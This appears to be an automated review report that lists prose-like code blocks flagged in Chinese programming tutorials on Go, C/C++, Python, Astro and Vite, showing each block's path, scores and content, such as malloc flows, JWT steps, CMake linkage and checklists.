## [UNWRAP] 015-go/042-GoFileMonitor.md:187 lang=
原因: 散文特征 4.1 codeRatio 0.00
上下文前文:

`inotify_add_watch` 系统调用流程：

块内容(9行):
```
用户态: inotify_add_watch(fd, path, mask)
   ↓
内核态: sys_inotify_add_watch
   ↓
1. 通过 fd 找到 inotify_group
2. 通过 path 解析 inode（path_lookup）
3. 创建 inotify_inode_mark（若已存在则更新）
4. 将 mark 添加到 inode 的 notification list
5. 返回 wd（watch descriptor）
```

## [UNWRAP] 015-go/049-GoOAuth2.md:351 lang=
原因: 散文特征 6.0 codeRatio 0.13
上下文前文:

JWT 验证算法：

块内容(8行):
```
1. 分割 JWT 为三部分（O(n)，n = JWT 长度）
2. Base64URL 解码 Header（O(n)）
3. 解析 Header，获取 alg（O(1)）
4. 根据 alg 选择验证密钥（O(1) 或 O(log n)，取决于密钥轮换策略）
5. 验证签名（O(n) for HMAC，O(1) for RSA/ECDSA）
6. Base64URL 解码 Payload（O(n)）
7. 解析 Claims（O(n)）
8. 验证 exp、nbf、iat、iss、aud（O(1)）
```

## [UNWRAP] 015-go/062-PackageManagementDetailed.md:569 lang=text
原因: 散文特征 4.0 codeRatio 0.00
上下文前文:

`vendor/modules.txt` 片段：

块内容(7行):
```
# github.com/gin-gonic/gin v1.9.1
## explicit
github.com/gin-gonic/gin
github.com/gin-gonic/gin/internal
# github.com/gin-contrib/sse v0.1.0
## indirect
github.com/gin-contrib/sse
```

## [UNWRAP] 022-c/005-VariableConstant.md:2402 lang=
原因: 散文特征 13.6 codeRatio 0.12
上下文前文:

### 12.9 学习笔记模板

块内容(25行):
```
# 学习笔记:变量与常量

## 我已掌握
- [ ] 变量声明的语法
- [ ] 四种存储期的区别
- [ ] const 的正确使用
- [ ] static 的多义性

## 我有疑问
- [ ] extern "C" 是什么意思?
- [ ] 为什么 C 的 const 不能用作数组大小?
- [ ] volatile 真的能保证线程安全吗?

## 实践项目
- [ ] 写一个使用全局配置的小程序
- [ ] 实现一个线程安全的计数器
- [ ] 用 constexpr 替换项目中的 #define

## 阅读进度
- [ ] K&R 第 1-4 章
- [ ] C Primer Plus 第 3-9 章
- [ ] Expert C Programming 第 1-3 章

## 反思
(写下你自己的理解与疑问)
```

## [REVIEW] 022-c/011-DynamicMemoryManagement.md:617 lang=
原因: prose 5.3 code 0.17
上下文前文:

#### 5.1.3 分配流程

块内容(12行):
```
malloc(size)
1. 计算 chunk 大小 (含 metadata,对齐)
2. 若 size 在 fastbin 范围:
   a. 查 fastbin,命中则返回
3. 若 size 在 smallbin 范围:
   a. 查 smallbin,命中则返回
4. 遍历 unsorted bin:
   a. 精确匹配则返回
   b. 否则放入对应 small/large bin
5. 查 large bin (best-fit)
6. 若仍无,使用 top chunk
7. 若 top chunk 不足,sysmalloc 向 OS 申请
```

## [REVIEW] 022-c/011-DynamicMemoryManagement.md:634 lang=
原因: prose 3.8 code 0.10
上下文前文:

#### 5.1.4 释放流程

块内容(10行):
```
free(ptr)
1. 计算 chunk 大小
2. 若 size 在 tcache 范围且未满:
   a. 加入 tcache,返回
3. 若 size 在 fastbin 范围:
   a. 加入 fastbin,返回
4. 否则:
   a. 合并相邻空闲 chunk
   b. 加入 unsorted bin
   c. 若 chunk 是顶 chunk,可能 trim 给 OS
```

## [REVIEW] 022-c/031-DynamicStaticLibrary.md:358 lang=
原因: prose 2.0 code 0.00
上下文前文:

**BSD/SysV/GNU 三种格式**：

块内容(10行):
```
!<arch>\n              <- 8 字节全局 magic
"mymath.o/0"           <- 成员名（以 / 结尾表示 SysV/GNU 格式）
"1234567890"           <- 修改时间戳（10 字节）
"0"                    <- 所有者 ID（6 字节）
"0"                    <- 组 ID（6 字节）
"100644"               <- 文件模式（8 字节）
"1024"                 <- 文件大小（10 字节）
"`\n"                  <- 结束标记（2 字节）
[文件内容 1024 字节]
[0 或 1 个填充字节，使下个成员起始地址为偶数]
```

## [REVIEW] 022-c/033-BuildSystem.md:888 lang=
原因: prose 3.4 code 0.00
上下文前文:

`target_link_libraries` 的三个关键字决定了依赖如何传播：

块内容(13行):
```
假设：mylib 是一个库目标，myapp 链接 mylib

target_link_libraries(mylib
    PUBLIC  core_lib      # core_lib 对 mylib 自身和 mylib 的使用者都可见
    PRIVATE utils_lib     # utils_lib 仅 mylib 内部使用，不传递给 myapp
    INTERFACE api_lib     # api_lib 仅传递给 myapp，mylib 自身不使用
)

结果：
- mylib 编译时：使用 core_lib, utils_lib 的头文件
- mylib 链接时：链接 core_lib, utils_lib
- myapp 编译时：使用 core_lib, api_lib 的头文件（不含 utils_lib）
- myapp 链接时：链接 mylib, core_lib, api_lib（不含 utils_lib）
```

## [REVIEW] 022-c/034-StaticAnalysisDebug.md:1149 lang=
原因: prose 8.0 code 0.32
上下文前文:

`~/.gdbinit` 或 `.gdbinit`:

块内容(38行):
```
# 自动加载安全配置
set auto-load safe-path /

# 历史记录
set history save on
set history filename ~/.gdb_history
set history size 1000

# 显示设置
set print pretty on
set print object on
set print static-members on
set print vtbl on
set print demangle on
set print sevenbit-strings off
set print array on
set print elements 200

# 字符集
set charset UTF-8

# 提示符
set prompt (gdb) 

# 默认汇编风格
set disassembly-flavor intel

# 自定义命令
define print_string
  if $arg0 != 0
...截断
```

## [UNWRAP] 023-cpp/025-NamespaceLinkage.md:2603 lang=
原因: 散文特征 8.1 codeRatio 0.05
上下文前文:

### 12.3 ADL 查找规则速查

块内容(19行):
```
对于未限定函数调用 f(args...)：

1. 收集每个实参的关联命名空间：
   - 类类型 T：T 的定义所在命名空间
   - 类类型 T：T 的基类所在命名空间
   - 模板特化 X<T>：X 与 T 的命名空间
   - 内联命名空间：内联命名空间本身
   - 枚举类型：枚举所在命名空间

2. 在以下位置查找候选函数：
   - 当前作用域及外层作用域（未限定查找）
   - 所有关联命名空间（ADL）

3. 重载决议从所有候选函数中选择最佳匹配

特殊情况：
   - 运算符表达式：a + b 也会触发 ADL
   - 模板函数：实参推导后再 ADL
   - 显式限定：std::swap(a, b) 不触发 ADL
```

## [REVIEW] 023-cpp/039-CppEmbedded.md:89 lang=text
原因: prose 1.3 code 0.13
上下文前文:

### 1.5 演进时间线

块内容(15行):
```
1972  C 语言                      K&R C
1985  C++ 1.0                     Stroustrup
1990s 8 位 MCU + C 主导           8051, AVR, PIC
1996  EC++ Specification          日本嵌入式协会
1998  C++98 ISO/IEC 14882         标准化
2003  MISRA C++:2008              汽车工业
2008  AUTOSAR C++14               汽车软件联盟
2011  C++11                       constexpr / atomic / noexcept
2014  C++14                       constexpr 增强
2017  C++17                       constexpr if / std::byte
2018  Zephyr RTOS C++ 支持        Linux Foundation
2020  C++20                       concept / consteval / coroutine
2023  MISRA C++:2023              基于 C++17/20
2023  C++23                       std::expected / std::print
2026  C++26 草案                  constexpr 更多扩展
```

## [UNWRAP] 023-cpp/041-CppCodeStyle.md:1305 lang=markdown
原因: 散文特征 20.3 codeRatio 0.03
上下文前文:

### 7.4 Code Review 检查清单

块内容(37行):
```
# Code Review Checklist

## 通用
- [ ] 代码符合项目规范（clang-format、clang-tidy 通过）
- [ ] 无明显性能问题（无不必要的拷贝、无 O(n^2) 循环）
- [ ] 无内存泄漏（RAII、智能指针）
- [ ] 无未定义行为（无空指针解引用、无越界访问）
- [ ] 异常安全级别明确（No-throw / Strong / Basic）

## 命名
- [ ] 类型、函数、变量、常量命名符合规范
- [ ] 名称具有描述性，无缩写歧义
- [ ] 成员变量使用统一后缀（如 `_`）

## 类设计
- [ ] 遵循单一职责原则
- [ ] 公共接口最小化
- [ ] 成员变量私有化
- [ ] 遵循三/五/零法则
- [ ] `const` 正确性

## 函数
- [ ] 函数长度 < 50 行
- [ ] 参数数量 < 5 个
- [ ] 避免输出参数（优先返回值）
- [ ] `noexcept` 标记正确

## 错误处理
- [ ] 错误处理策略一致（异常或错误码，不混用）
- [ ] 资源释放不依赖错误处理
...截断
```

## [REVIEW] 023-cpp/061-Cpp20Concept.md:152 lang=text
原因: prose 1.9 code 0.00
上下文前文:

### 1.7 演进时间线

块内容(16行):
```
1988  C++ 模板设计               Stroustrup
1994  STL 由 HP 实现             Stepanov & Lee
1998  C++98 标准化               模板正式纳入
2003  SFINAE 原则形式化          Vandevoorde
2003  Indiana 概念提案启动       Gregor, Lumsdaine
2008  C++0x 草案 N2914           概念进入草案
2009  Frankfurt 会议否决         概念地图过于复杂
2013  Concepts Lite (N3580)      Stroustrup & Sutton
2014  GCC 6 实验性实现           -fconcepts 选项
2017  Jacksonville 进入 C++20    ISO/IEC WG21
2018  Rapperswil <concepts> 定稿 Eric Niebler
2019  Ranges 完成标准化          P0896 合入
2020  C++20 发布                 ISO/IEC 14882:2020
2021  主流编译器完整支持         GCC 10+, Clang 10+, MSVC 19.29+
2023  C++23 小幅增强             expected / flat_map
2026  C++26 草案                 反射 + 概念协同
```

## [REVIEW] 023-cpp/067-CppProjectPractice.md:21 lang=
原因: prose 2.0 code 0.00
上下文前文:

#### 1.2.2 类图

块内容(10行):
```
 +
 | FileManager |<----| CommandParser |---->| UI |<----| ErrorHandler |
 +
 | - list_dir() | | - parse() | | - display() | | - handle() |
 | - create_file()| | - get_command()| | - get_input() | | - log_error() |
 | - delete_file()| +----------------+ +----------------+ +----------------+
 | - move_file() |
 | - copy_file() |
 | - create_dir() |
 +
```

## [REVIEW] 032-python/010-PythonVirtualEnv.md:1172 lang=txt
原因: prose 1.0 code 0.00
上下文前文:

**错误**：

块内容(4行):
```
# requirements.txt（无版本约束）
fastapi
uvicorn
pydantic
```

## [REVIEW] 032-python/020-PythonDocker.md:135 lang=
原因: prose 1.0 code 0.00
上下文前文:

和 .gitignore 类似，.dockerignore 文件指定哪些文件不复制到镜像中：

块内容(13行):
```
# .dockerignore 文件内容
__pycache__
*.pyc
*.pyo
.git
.gitignore
.venv
venv
.env
*.md
.pytest_cache
.mypy_cache
.ruff_cache
```

## [UNWRAP] 032-python/044-PythonPackagingEvolution.md:1028 lang=markdown
原因: 散文特征 11.2 codeRatio 0.00
上下文前文:

使用 Keep a Changelog 格式：

块内容(20行):
```
## [1.2.3] - 2026-07-20

### Added
- 新增 calculate() 函数支持统计计算
- 新增 CLI 子命令 calc

### Changed
- 重构 greet() 支持国际化

### Deprecated
- 弃用 old_greet()，将在 2.0.0 移除

### Removed
- 移除 Python 3.7 支持

### Fixed
- 修复空列表引发的 ZeroDivisionError

### Security
- 升级 requests 至 2.31.0 修复 CVE-2023-32681
```

## [REVIEW] 032-python/044-PythonPackagingEvolution.md:1633 lang=
原因: prose 1.0 code 0.00
上下文前文:

**基本写法：MANIFEST.in**
`include <文件模式>`
块内容(3行):
```
# 显式声明包含文件
include README.md LICENSE
recursive-include mypackage/data *.json *.txt
```

## [REVIEW] 032-python/047-PythonCodeQuality.md:1633 lang=
原因: prose 2.0 code 0.10
上下文前文:

#### 13.5.1 代码 review checklist

块内容(10行):
```
[ ] 类型注解完整且正确
[ ] 公共函数有 docstring（Google 风格）
[ ] 单元测试覆盖核心路径与边界
[ ] Ruff/mypy 无错误
[ ] 无 print 语句（使用 logging）
[ ] 无 TODO/FIXME 未跟踪
[ ] 安全扫描无高危
[ ] 性能关键路径有基准测试
[ ] 命名符合 PEP 8
[ ] 单文件不超过 500 行
```

## [REVIEW] 032-python/059-PackagePublish.md:844 lang=
原因: prose 2.0 code 0.00
上下文前文:

#### 陷阱 5：在 MANIFEST.in 中遗漏文件

块内容(3行):
```
# 反例：sdist 不包含 README
include LICENSE
# 缺少 README.md
```

## [REVIEW] 035-astro/001-AstroOverview.md:161 lang=text
原因: prose 1.7 code 0.13
上下文前文:

理解 Astro 项目结构，相当于看一本书的目录——每个目录都有明确分工：

块内容(15行):
```
my-astro-site/
  src/                      # 源码目录
    pages/                  # 路由目录：每个 .astro / .md 文件对应一个页面
      index.astro           # 首页 /
      about.md              # /about
      blog/[slug].astro     # 动态路由，生成 /blog/xxx
    components/             # 组件目录（.astro、.jsx、.vue 等）
    layouts/                # 布局组件目录（页面骨架）
    content/                # 内容目录（内容集合的数据源，可选）
    styles/                 # 全局样式
    content.config.ts       # 内容集合配置文件（用到内容集合时创建）
  public/                   # 静态资源：favicon、robots.txt 等，原样拷贝
  astro.config.mjs          # Astro 配置文件
  package.json              # 依赖与脚本
  tsconfig.json             # TypeScript 配置
```

## [REVIEW] 035-astro/003-PagesRouting.md:65 lang=md
原因: prose 1.9 code 0.00
上下文前文:

### 2.2 一个纯 Markdown 的页面

块内容(7行):
```
---
title: 关于本站
description: FANDEX 学习平台简介
---
# 关于本站

FANDEX 是一个面向零基础中文学习者的编程学习平台。
```

## [REVIEW] 035-astro/005-ContentCollections.md:105 lang=md
原因: prose 3.4 code 0.13
上下文前文:

集合内每篇文档的 frontmatter 必须通过 schema 校验：

块内容(16行):
```
---
title: 内容集合使用指南
description: 学习如何定义 schema 并查询内容
pubDate: 2026-08-01
tags:
  - Astro
  - 内容
draft: false
author: FANDEX
---

这里是文档正文。frontmatter 与正文之间用空行分隔。

- frontmatter 以 `---` 包裹，字段必须符合 schema 声明；
- 缺少必填字段、类型错误、出现未声明字段，都会导致**构建失败**并给出精确报错；
- 编辑器装上 Astro 扩展后，写文档时就有字段补全提示。
```

## [UNWRAP] 036-vite/006-DevServerHMR.md:229 lang=text
原因: 散文特征 6.5 codeRatio 0.11
上下文前文:

把以上串起来，一次保存动作的完整链路是：

块内容(9行):
```
1. 你保存文件
2. chokidar 监听到文件变化
3. 服务器在 ModuleGraph 中定位受影响的模块并使其失效
4. 服务器沿 importers 向上寻找 accept 边界，计算出"更新范围"
5. 服务器通过 WebSocket 推送 { type: 'update', updates: [...] } 消息
6. 浏览器端 @vite/client 收到消息
7. 浏览器用 import() 以 "原路径?t=时间戳" 重新拉取模块（时间戳用于绕过浏览器缓存）
8. 执行对应模块的更新逻辑（React Fast Refresh / Vue 重渲染 / 你的 accept 回调）
9. 页面其余部分原封不动
```

## [REVIEW] 036-vite/007-BuildSplit.md:41 lang=text
原因: prose 5.0 code 0.29
上下文前文:

`vite build` 把开发产物转换成可上线的优化版本。Vite 8 中整条流程由 **Rolldown** 统一完成（开发与生产同一套管线，详见 009 篇）。一次构建的执行链：

块内容(7行):
```
vite build 的执行链：
1. 入口分析：从 index.html 追踪所有模块
2. 转换与解析：TS/JSX 转 JS、处理 import 图
3. tree-shaking：删除未使用的代码
4. 代码分割：按动态 import 边界与 manualChunks 拆分 chunk
5. 压缩：JS/CSS 压缩 + 文件内容哈希
6. 输出到 dist/（默认）
```

## [UNWRAP] 036-vite/009-Vite8Rolldown.md:179 lang=text
原因: 散文特征 4.4 codeRatio 0.00
上下文前文:

### 6.2 其它值得关注的新特性

块内容(17行):
```
1. TypeScript 路径别名原生支持
   不再需要 vite-tsconfig-paths 插件，配置 resolve.tsconfigPaths 即可读取 tsconfig 的 paths

2. 装饰器元数据支持
   NestJS 等依赖 emitDecoratorMetadata 的框架无需再折腾 Babel/SWC 配置

3. 内置 Vite Devtools
   浏览器扩展形态，可查看模块依赖图、转换结果、触发依赖预构建、分析产物 chunk

4. 浏览器日志转发（forwardConsole）
   浏览器 console 日志转发到终端（006 篇第 8 节）

5. Chunk Import Map（实验性）
   用导入映射提升 chunk 缓存效率，缓解"改一行代码哈希级联变化"问题

6. Wasm ESM 支持
   .wasm?init 导入支持在 SSR 环境中使用
```

## [REVIEW] 036-vite/009-Vite8Rolldown.md:209 lang=text
原因: prose 3.1 code 0.00
上下文前文:

三个值得了解的生态新特性：

块内容(10行):
```
1. Hook Filters（钩子过滤）
   插件声明 id/code/moduleType 过滤器后，不匹配的文件不再进入 JS 桥接层
   ——插件再多，构建时间也不线性增长

2. 内置 Rust 插件
   replace（变量替换）等高频场景提供 Rust 原生实现（replacePlugin），
   配置更简单、性能更好；esmExternalRequirePlugin 等也一并内置

3. registry.vite.dev 官方插件目录
   每日同步 npm 数据，可检索 Vite/Rolldown/Rollup 三类插件
```

## [UNWRAP] 036-vite/009-Vite8Rolldown.md:237 lang=text
原因: 散文特征 4.8 codeRatio 0.00
上下文前文:
pnpm add -D vite@latest @vitejs/plugin-vue@latest
```

块内容(8行):
```
2. 检查要点（官方迁移指南）：
   - Node.js 版本：需要 20.19+ 或 22.12+
   - 配置文件 vite.config.ts 通常无需改动（rollupOptions 等保持兼容，
     迁移到 rolldownOptions 更佳，旧写法暂时保留并给出弃用提示）
   - 确认浏览器目标：默认从 Vite 7 的 Chrome 107 等提升到
     'baseline-widely-available'（Chrome 111 / Edge 111 / Firefox 114 / Safari 16.4）
   - 删除或替换依赖 esbuild 专属行为的代码（Vite 8 不再内置 esbuild）
   - 第三方插件升级到最新版
```

## [NESTED] 009-vue3/035-Vue3TheoryKnowledge.md | 2 处（行 39,280）

## [NESTED] 014-csharp/013-CSharpGameDevUnity.md | 2 处（行 330,340）

## [NESTED] 014-csharp/015-AsyncProgrammingDetailed.md | 2 处（行 145,154）

## [NESTED] 015-go/044-GoRegex.md | 2 处（行 158,164）
